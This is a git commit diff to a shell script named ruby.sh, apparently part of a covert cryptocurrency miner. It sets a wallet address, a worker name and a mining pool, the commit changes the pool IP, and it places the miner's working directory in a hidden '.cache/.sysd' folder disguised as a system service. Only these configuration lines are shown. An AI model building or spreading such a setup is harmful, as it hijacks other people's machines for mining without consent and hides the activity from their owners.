464a7a9d23691059693cd7d1158d181e7a8c4f81
jaydmarks227 <34647974+jaydmarks227@users.noreply.github.com>
2026-03-21 18:07:18 +0100

    Update ruby.sh

--- ruby.sh
+++ ruby.sh
@@ -3,7 +3,7 @@
 # إعداد بيانات المحفظة والمعدّن
 WALLET="88DcxveXeHaRDYLbmAxBuMZBsYwEtrDcb4EUWJvCQjKsNo2ieFTrBLNBhpVdFfLTXnRDcnJgg7Fpre43fbFMnfxkV2ZrpEm"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
 WORKER="au"
-POOL="66.23.199.44:443"
+POOL="45.155.102.89:443"
 THREADS=
 # مجلد العمل
 WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
